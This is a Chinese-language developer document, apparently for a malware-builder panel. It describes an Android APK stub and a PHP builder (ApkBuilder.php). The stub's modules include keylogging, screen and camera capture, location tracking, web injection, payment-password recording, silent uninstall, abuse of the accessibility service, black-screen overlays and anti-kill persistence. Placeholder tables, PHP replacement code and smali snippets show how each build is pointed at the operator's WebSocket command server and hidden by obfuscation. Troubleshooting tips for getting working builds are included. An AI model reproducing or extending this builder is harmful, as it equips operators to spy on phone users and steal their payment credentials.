# 飞鹰管理系统 - APK Stub 模板代码分析

> 本文档详细分析 APK Stub 模板的代码结构、模块功能和技术实现。

---

## 📊 概述

APK Stub 是预编译的 Android 客户端模板，位于 `src/private/apkstub/extracted_apkstub/`。构建系统通过修改此模板生成定制化的 APK 文件。

### 基本统计

| 指标 | 数值 |
|------|------|
| Smali 文件总数 | 22,341 |
| DEX 文件数量 | 4 个 (smali, smali_classes2-4) |
| 混淆包数量 | 500+ |
| 主要混淆命名空间 | `myobfuscated/` |

---

## 🗂️ 目录结构

```
extracted_apkstub/
├── original/
│   └── AndroidManifest.xml          # 应用清单 (二进制格式)
│
├── res/                              # 资源文件
│   ├── drawable*/                    # 图标资源 (mylogo.png)
│   ├── values/strings.xml            # 字符串资源
│   └── values-kk/                    # 哈萨克语本地化
│
├── smali/                            # DEX 1 - 核心应用代码
│   ├── com/icontrol/protector/       # ⭐ 主应用包 (100+ 文件)
│   │   ├── My_Configs.smali          # 配置占位符类
│   │   ├── ActivMain.smali           # 主 Activity
│   │   ├── AccessServices.smali      # 无障碍服务
│   │   ├── EngineWorker.smali        # 后台工作服务
│   │   ├── WorkServices.smali        # 工作服务
│   │   ├── LiveChat.smali            # 实时通信服务
│   │   └── ...
│   └── androidx/
│       ├── room/                     # Room 数据库
│       ├── savedstate/               # 状态保存
│       └── versionedparcelable/      # 版本化序列化
│
├── smali_classes2/                   # DEX 2 - 密码学和工具库
│   └── myobfuscated/
│       ├── Hf0/                      # 椭圆曲线密码学
│       ├── Kf0/                      # SecP224R1 曲线
│       ├── Mf0/                      # 密码学支持
│       ├── Of0/                      # BigInteger 工具
│       ├── Pf0/                      # 十六进制编码
│       ├── Vf0/                      # 调色板/UI
│       ├── ag0/                      # RecyclerView 适配器
│       └── ...                       # 68+ 混淆包
│
├── smali_classes3/                   # DEX 3 - 扩展功能
│   └── myobfuscated/                 # 500+ 混淆包
│
└── smali_classes4/                   # DEX 4 - 附加模块
    ├── myobfuscated/
    └── X/                            # 额外混淆包
```

---

## ⭐ 核心应用组件 (com/icontrol/protector/)

这是 APK 的主要业务逻辑所在，包含 100+ 个 smali 文件。

### 核心类列表

| 类名 | 功能 | 说明 |
|------|------|------|
| `My_Configs.smali` | **配置中心** | 存储所有可配置参数的占位符 |
| `ActivMain.smali` | **主 Activity** | 应用入口，WebView 界面 |
| `AccessServices.smali` | **无障碍服务** | 核心监控服务，继承 AccessibilityService |
| `EngineWorker.smali` | **引擎服务** | 后台工作引擎 |
| `WorkServices.smali` | **工作服务** | 辅助后台服务 |
| `LiveChat.smali` | **实时通信** | WebSocket 通信服务 |
| `ScreenCaps.smali` | **屏幕截图** | 屏幕捕获功能 |
| `CameraCap.smali` | **摄像头** | 摄像头捕获功能 |
| `LocationMonitor.smali` | **位置监控** | GPS 定位功能 |
| `LiveKeysStrok.smali` | **键盘记录** | 按键记录功能 |
| `Webjector.smali` | **Web 注入** | WebView 注入功能 |
| `LockActivity.smali` | **锁屏界面** | 锁屏/弹窗界面 |
| `MuteActivity.smali` | **静默界面** | 静默操作界面 |
| `MuteUninstall.smali` | **静默卸载** | 静默卸载功能 |
| `RecordPayPassWord.smali` | **密码记录** | 支付密码记录 |
| `MyJobService.smali` | **定时任务** | JobScheduler 服务 |

### 启动器别名

| 类名 | 用途 |
|------|------|
| `SIMLauncherAlias.smali` | SIM 卡相关启动器 |
| `OppoLauncherAlias.smali` | OPPO 设备启动器 |
| `HiddenActivity` | 隐藏入口 Activity |

---

## 🔧 配置占位符系统 (My_Configs.smali)

`My_Configs.smali` 是配置中心，包含所有构建时需要替换的占位符。

### 占位符列表

| 占位符 | 字段名 | 说明 | ApkBuilder 替换值 |
|--------|--------|------|-------------------|
| `[Client_N]` | `Mob_Name` | 客户端名称 | `clientname` |
| `[_NOTIFI_TITLE_]` | `_Notfy_TITL_` | 通知标题 | `notifyTitle` |
| `[_NOTIFI_MSG_]` | `_Notfy_MSG_` | 通知内容 | `notifyMsg` |
| `[USE-AUTOGRANT]` | `loadingText` | 登录标题 | `loginTitle` |
| `[log-dis]` | `_Login_dis_` | 登录描述 | `loginDis` |
| `[log-btn]` | `_Login_btn_` | 登录按钮 | `loginBtn` |
| `[log-lng]` | `_Login_lng_` | 语言代码 | `lngShort` |
| `[USER_DOM]` | `mydom` | 服务器域名 | `userHost` |
| `[USER_MAIL]` | `USR_MAIL` | 用户邮箱 | `email` |
| `[BSE_URL]` | `HOME_NAME` | 基础 URL | `http(s)://userHost` |
| `[USE-SUPER]` | `Use_Access` | 无障碍开关 | `useAccess` (0/1) |
| `[USE-ALLPRIM]` | `User_allPrims` | 全权限开关 | `userAllprims` (0/1) |
| `[USE-NOKILL]` | `Anti_Kill` | 防杀开关 | `useAntkill` (0/1) |
| `[USE-FAKE]` | `Hide_Type` | 隐藏类型 | `hideType` |
| `[USE-BLACK]` | `Black_Screen` | 黑屏遮挡 | `userBlackprims` (0/1) |
| `[USE-DRAWOVER]` | `Draws_overs` | 悬浮窗开关 | `useDraw` (0/1) |
| `[USE-OOENACC]` | `Open_access` | 自动开无障碍 | `openAccess` (0/1) |
| `[USE-DIAO]` | `D_iao` | 弹窗锁定 | `diaoType` (0/1) |
| `[USE-GUID]` | `Access_type` | 安装引导类型 | `installType` |
| `[USE-STORE]` | `Is_Store` | 商店模式 | `buildType` (S=1, C=0) |
| `[USE-CAPLOCK]` | `Capture_Lock` | 截图锁定 | 固定 `0` |
| `[AST-PAS]` | `AsstsKey` | 资源加密密钥 | 随机生成 32 位 hex |

### WebSocket 地址构建

```smali
# My_Configs.smali 中的 WebSocket 地址构建
new-instance v0, Ljava/lang/StringBuilder;
invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
const-string v1, "wss://"           # 或 "ws://" (根据 HTTPS 判断)
invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)
sget-object v1, Lcom/icontrol/protector/My_Configs;->mydom:Ljava/lang/String;
invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)
const-string v1, "/api/ws/"
invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)
# 结果: wss://[USER_DOM]/api/ws/
```

### 其他静态配置

| 字段 | 值 | 说明 |
|------|-----|------|
| `HA` | `com.icontrol.protector.HiddenActivity` | 隐藏 Activity 类名 |
| `MA` | `com.icontrol.protector.ActivMain` | 主 Activity 类名 |
| `TouchsPath` | `/systems/sys/apps/tch` | 触摸数据路径 |
| `errospath` | `/systemscrash/sys/apps/log` | 错误日志路径 |
| `Drop_name` | `com.appd.instll` (混淆) | 安装包名 |

---

## 🔄 ApkBuilder.php 构建流程

`src/private/ApkBuilder.php` 负责将模板转换为定制 APK。

### 构建步骤

```
1. checkDependencies()     - 检查 Java、apktool.jar
2. prepareWorkDir()        - 复制模板到临时目录
3. modifySmaliConfig()     - ⭐ 替换 My_Configs.smali 占位符
4. modifyAndroidManifest() - 修改包名
5. modifyStringsXml()      - 修改应用名称
6. modifyApktoolYml()      - 修改版本号
7. replaceIcon()           - 替换图标 (mylogo.png)
8. buildApk()              - apktool 重新打包
9. signApk()               - 签名 APK
10. moveToOutput()         - 移动到输出目录
```

### 关键替换逻辑 (modifySmaliConfig)

```php
// ApkBuilder.php 中的替换映射
$replacements = [
    '[Client_N]'        => $this->config['clientname'],
    '[_NOTIFI_TITLE_]'  => $this->config['notifyTitle'],
    '[_NOTIFI_MSG_]'    => $this->config['notifyMsg'],
    '[USE-AUTOGRANT]'   => $this->config['loginTitle'],
    '[log-dis]'         => $this->config['loginDis'],
    '[log-btn]'         => $this->config['loginBtn'],
    '[log-lng]'         => $this->config['lngShort'],
    '[USER_DOM]'        => $this->config['userHost'],
    '[USER_MAIL]'       => $this->config['email'],
    '[BSE_URL]'         => $baseUrl,  // http(s)://userHost
    '[USE-SUPER]'       => $this->config['useAccess'],
    '[USE-ALLPRIM]'     => $this->config['userAllprims'],
    '[USE-NOKILL]'      => $this->config['useAntkill'],
    '[USE-FAKE]'        => $this->config['hideType'],
    '[USE-BLACK]'       => $this->config['userBlackprims'],
    '[USE-DRAWOVER]'    => $this->config['useDraw'],
    '[USE-OOENACC]'     => $this->config['openAccess'],
    '[USE-DIAO]'        => $this->config['diaoType'],
    '[USE-GUID]'        => $this->config['installType'],
    '[USE-STORE]'       => ($buildType === 'S') ? '1' : '0',
    '[USE-CAPLOCK]'     => '0',
    '[AST-PAS]'         => bin2hex(random_bytes(16)),
];

// WebSocket 协议替换
if (!$useWss) {
    $content = str_replace('const-string v1, "wss://"', 
                           'const-string v1, "ws://"', $content);
}
```

### 包名重命名

当用户指定的包名与默认包名 `com.icontrol.protector` 不同时：

1. 修改 `AndroidManifest.xml` 中的 package 属性
2. 重命名 smali 目录: `smali/com/icontrol/protector/` → `smali/[new/package/path]/`
3. 替换所有 smali 文件中的类引用: `Lcom/icontrol/protector/` → `L[new/package/path]/`

---

## 🔐 密码学模块分析

### 椭圆曲线密码学 (ECC)

Stub 实现了完整的椭圆曲线密码学栈，用于安全通信。

#### 模块映射

| 混淆包 | 功能 | 关键类 |
|--------|------|--------|
| `Hf0/` | ECC 基础设施 | 曲线抽象、点运算 |
| `Kf0/` | SecP224R1 曲线 | NIST P-224 实现 |
| `Mf0/` | 密码学参数 | 曲线配置 |
| `Of0/` | BigInteger 工具 | 大数运算 |
| `Pf0/` | 编码工具 | 十六进制转换 |

#### SecP224R1 曲线参数

```
曲线: NIST P-224 (secp224r1)
素数 p: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000001
系数 a: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFE
系数 b: B4050A850C04B3ABF54132565044B0B7D7BFD8BA270B39432355FFB4
阶 n:   FFFFFFFFFFFFFFFFFFFFFFFFFFFF16A2E0B8F03E13DD29455C5C2A3D
余因子: 1
位长度: 224 bits
```

#### 点编码格式

| 编码类型 | 前缀字节 | 说明 |
|----------|----------|------|
| 无穷远点 | `0x00` | 单字节表示 |
| 压缩格式 | `0x02/0x03` | X 坐标 + Y 奇偶位 |
| 未压缩格式 | `0x04` | X + Y 完整坐标 |
| 混合格式 | `0x06/0x07` | 完整坐标 + Y 奇偶位 |

#### 代码示例 (Hf0/b.smali)

```smali
# 点解码方法
.method public final d([B)Lmyobfuscated/Hf0/d;
    # 根据首字节判断编码格式
    # 0x00 -> 无穷远点
    # 0x02/0x03 -> 压缩格式
    # 0x04 -> 未压缩格式
    # 0x06/0x07 -> 混合格式
```

---

## 📱 AndroidX 组件

### Room 数据库

| 文件 | 功能 |
|------|------|
| `MultiInstanceInvalidationService.smali` | 多实例数据库同步服务 |
| `MultiInstanceInvalidationService$a.smali` | Binder 实现 |
| `MultiInstanceInvalidationService$b.smali` | 回调列表管理 |

### SavedState

| 文件 | 功能 |
|------|------|
| `Recreator.smali` | Activity 状态恢复 |
| `Recreator$a.smali` | 状态恢复回调 |
| `Recreator$b.smali` | 状态保存回调 |

### VersionedParcelable

| 文件 | 功能 |
|------|------|
| `ParcelImpl.smali` | 版本化 Parcelable 实现 |

---

## 🎨 UI 组件

### RecyclerView 适配器 (ag0/)

```smali
# ag0/a.smali - 颜色选择器适配器
.class public final Lmyobfuscated/ag0/a;
.super Landroidx/recyclerview/widget/RecyclerView$Adapter;

# 字段
.field public final i:Lpicsart/colorpickerviews/pickerview/DefaultPickerView;
.field public final j:Lmyobfuscated/Vf0/b;

# 固定返回 2 个项目 (颜色选择器 + 调色板)
.method public final getItemCount()I
    const/4 v0, 0x2
    return v0
.end method
```

### 调色板视图 (Vf0/)

| 类 | 功能 |
|----|------|
| `Vf0/a` | 调色板视图基类 |
| `Vf0/b` | 调色板实现 |
| `Vf0/c` | 颜色回调接口 |

---

## 🔧 混淆模式分析

### 命名规则

| 模式 | 示例 | 说明 |
|------|------|------|
| 大写字母+数字 | `Hf0`, `Kf0`, `ag0` | 主要功能模块 |
| 小写字母+数字 | `bf.1`, `cf.1` | 辅助模块 |
| 大写+小写 | `kA`, `lA`, `mA` | 特殊功能模块 |
| 深度混淆 | `Laabab/b/c/y/i/c/...` | Kotlin 内部类 |

### 类命名

- 单字母: `a.smali`, `b.smali`, `c.smali`
- 内部类: `a$a.smali`, `b$a.smali`
- 匿名类: `a.1.smali`, `x.1.smali`

### 混淆工具

推测使用 **ProGuard/R8** 进行混淆，特征：
- 类名缩短为单字母
- 包名使用无意义字符组合
- 方法名保留 (如 `getItemCount`)
- 字段名缩短 (如 `i`, `j`, `k`)

---

## 📦 模块功能推测

基于代码分析，推测各模块功能：

### smali_classes2/myobfuscated/

| 包 | 推测功能 | 依据 |
|----|----------|------|
| `Hf0/` | ECC 密码学 | BigInteger 运算、点编码 |
| `If0/` | 密钥交换 | 与 Hf0 关联 |
| `Jf0/` | 签名验证 | 密码学相关 |
| `Kf0/` | SecP224R1 曲线 | 曲线参数常量 |
| `Mf0/` | 曲线配置 | 被 Hf0 引用 |
| `Of0/` | 数学工具 | BigInteger 转换 |
| `Pf0/` | 编码工具 | 十六进制处理 |
| `Vf0/` | UI 组件 | 调色板视图 |
| `Xf0/` | 抽象基类 | 多个内部类 |
| `ag0/` | 列表适配器 | RecyclerView |

### smali_classes3/myobfuscated/

| 包 | 推测功能 |
|----|----------|
| `Y8/`, `Z5/` | 网络通信 |
| `R4/`, `R6/` | 数据处理 |
| `L5/`, `B5/` | 文件操作 |
| `C8/` | 配置管理 |

---

## 📱 无障碍服务 (AccessServices.smali)

`AccessServices` 是应用的核心监控组件，继承自 `AccessibilityService`。

### 主要功能

| 功能 | 实现方式 |
|------|----------|
| 屏幕监控 | 监听 `AccessibilityEvent` |
| 自动点击 | `performAction(ACTION_CLICK)` |
| 文本输入 | `performAction(ACTION_SET_TEXT)` |
| 窗口遮挡 | `WindowManager` 悬浮窗 |
| 服务保活 | 多线程循环检查 |

### 关键字段

```smali
# 静态字段
.field public static N:Lcom/icontrol/protector/AccessServices;  # 单例实例
.field public static F:Landroid/view/WindowManager;             # 窗口管理器
.field public static G:Landroid/widget/FrameLayout;             # 遮挡层
.field public static o:Z                                        # 状态标志
.field public static u:Ljava/util/List;                         # 任务列表

# 实例字段
.field public b:Landroid/webkit/WebView;                        # WebView 实例
.field private j:Ljava/util/concurrent/ThreadPoolExecutor;      # 线程池 (10线程)
.field private l:Landroid/os/PowerManager$WakeLock;             # 唤醒锁
.field private n:Landroid/net/wifi/WifiManager$WifiLock;        # WiFi 锁
```

### 服务保活机制

```smali
# 循环检查并重启服务
.method private synthetic r()V
    :goto_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z
    if-nez v1, :cond_0
    
    invoke-direct {p0, v0}, Lcom/icontrol/protector/AccessServices;->n(Landroid/content/Context;)V
    const-wide/16 v1, 0x1388  # 5000ms 间隔
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    goto :goto_0
.end method
```

### 启动的服务

| 服务类 | 功能 |
|--------|------|
| `EngineWorker` | 主引擎服务 |
| `WorkServices` | 工作服务 |
| `LiveChat` | 实时通信 |

---

## 🔄 构建时修改点

构建系统在生成 APK 时会修改以下内容：

### 1. AndroidManifest.xml

```xml
<!-- 修改项 -->
<manifest package="[用户指定包名]">
    <application android:label="[应用名称]">
        <!-- 权限根据配置添加/移除 -->
    </application>
</manifest>
```

### 2. 资源文件

| 资源 | 修改内容 | 目标文件 |
|------|----------|----------|
| 应用图标 | 用户上传的 PNG | `res/drawable*/mylogo.png` |
| 应用名称 | `BaseName` 字符串 | `res/values/strings.xml` |
| 无障碍描述 | 登录描述文字 | `res/values/strings.xml` |

### 3. Smali 配置注入

**文件**: `smali/com/icontrol/protector/My_Configs.smali`

```smali
# 替换前
const-string v0, "[Client_N]"
const-string v0, "[USER_DOM]"
const-string v1, "wss://"

# 替换后
const-string v0, "TestClient"
const-string v0, "192.168.1.100:8888"
const-string v1, "ws://"  # 如果是 HTTP
```

### 4. 版本信息

**文件**: `apktool.yml`

```yaml
versionCode: [计算值]    # appversion * 100
versionName: [版本号]    # 如 "1.0.0"
```

---

## 🛡️ 安全特性

### 通信安全

- **ECC 加密**: 使用 SecP224R1 曲线进行密钥交换
- **WebSocket**: 支持 WSS (TLS) 和 WS 协议
- **点压缩**: 支持多种点编码格式减少数据量
- **参数验证**: 严格验证曲线点有效性

### 代码保护

- **混淆**: 深度 ProGuard/R8 混淆
- **多 DEX**: 代码分散在 4 个 DEX 文件
- **字符串加密**: 使用 `[OBFS]` 前缀的字符串运行时解密
- **动态加载**: 部分功能可能动态加载

### 字符串混淆示例

```smali
# My_Configs.smali 中的混淆字符串
const-string v0, "[OBFS]com.appd.instll"
const-string v1, "[OBFS]"
invoke-static {v0, v1}, Laabab/.../cg0;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
# 运行时解密为实际值
```

---

## 📋 第三方库依赖

| 库 | 用途 | 位置 |
|----|------|------|
| AndroidX Room | 本地数据库 | `smali/androidx/room/` |
| AndroidX SavedState | 状态管理 | `smali/androidx/savedstate/` |
| Picsart ColorPicker | 颜色选择 UI | `smali_classes2/myobfuscated/ag0/` |
| Kotlin Stdlib | Kotlin 支持 | 混淆在各 DEX 中 |
| OkHttp/WebSocket | 网络通信 | 混淆在 `myobfuscated/` |

---

## 🔍 调试与分析

### 使用 build_apk.php 测试

```bash
# 配置 build_apk.php 中的参数
php build_apk.php

# 输出示例
[08:15:17] ℹ️ 飞鹰管理系统 - APK 构建脚本 v3
[08:15:17] ℹ️ 应用名称: 测试应用
[08:15:17] ℹ️ 包名: com.icontrol.protector
[08:15:17] ℹ️ 服务器: 192.168.31.35:8888
[08:15:30] ✅ APK 构建成功!
[08:15:30] ✅ 输出路径: /user/apps/991924/com.icontrol.protector/com.icontrol.protector.apk
```

### 验证配置注入

```bash
# 解压构建后的 APK
unzip app.apk -d extracted/

# 检查 My_Configs.smali 中的值是否正确替换
grep -n "const-string" extracted/smali/com/icontrol/protector/My_Configs.smali
```

### 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| APK 崩溃 | 包名修改不完整 | 检查所有 smali 文件中的类引用 |
| 无法连接服务器 | WebSocket 协议错误 | 检查 wss/ws 与 https/http 匹配 |
| 图标未替换 | 图标路径错误 | 确认 `mylogo.png` 在所有 drawable 目录 |
| 签名失败 | keystore 问题 | 检查 Java keytool 是否可用 |

---

## 📚 相关文档

- [APK 构建系统详解](./APK_BUILD_SYSTEM.md) - 构建流程和参数
- [系统功能详解](./SYSTEM_FEATURES.md) - 完整功能列表

---

## 📝 附录: 完整占位符速查表

| 占位符 | 类型 | 默认值 | 说明 |
|--------|------|--------|------|
| `[Client_N]` | 字符串 | - | 客户端标识名 |
| `[_NOTIFI_TITLE_]` | 字符串 | - | 通知标题 |
| `[_NOTIFI_MSG_]` | 字符串 | - | 通知内容 |
| `[USE-AUTOGRANT]` | 字符串 | - | 登录界面标题 |
| `[log-dis]` | 字符串 | - | 登录界面描述 |
| `[log-btn]` | 字符串 | - | 登录按钮文字 |
| `[log-lng]` | 字符串 | `cn` | 语言代码 (cn/en/ar) |
| `[USER_DOM]` | 字符串 | - | 服务器域名:端口 |
| `[USER_MAIL]` | 字符串 | - | 用户邮箱 |
| `[BSE_URL]` | 字符串 | - | 完整基础 URL |
| `[USE-SUPER]` | 0/1 | `1` | 无障碍服务开关 |
| `[USE-ALLPRIM]` | 0/1 | `1` | 请求全部权限 |
| `[USE-NOKILL]` | 0/1 | `0` | 防杀进程开关 |
| `[USE-FAKE]` | 字符串 | `null` | 隐藏类型 |
| `[USE-BLACK]` | 0/1 | `0` | 黑屏遮挡开关 |
| `[USE-DRAWOVER]` | 0/1 | `0` | 悬浮窗开关 |
| `[USE-OOENACC]` | 0/1 | `0` | 自动开启无障碍 |
| `[USE-DIAO]` | 0/1 | `0` | 弹窗锁定开关 |
| `[USE-GUID]` | 字符串 | `g` | 安装引导类型 |
| `[USE-STORE]` | 0/1 | `0` | 商店模式 (S=1) |
| `[USE-CAPLOCK]` | 0/1 | `0` | 截图锁定 |
| `[AST-PAS]` | hex | 随机 | 资源加密密钥 |

---

*文档版本: 2.0*  
*更新时间: 2026-01-29*  
*分析基于: extracted_apkstub 目录静态分析 + ApkBuilder.php 源码*
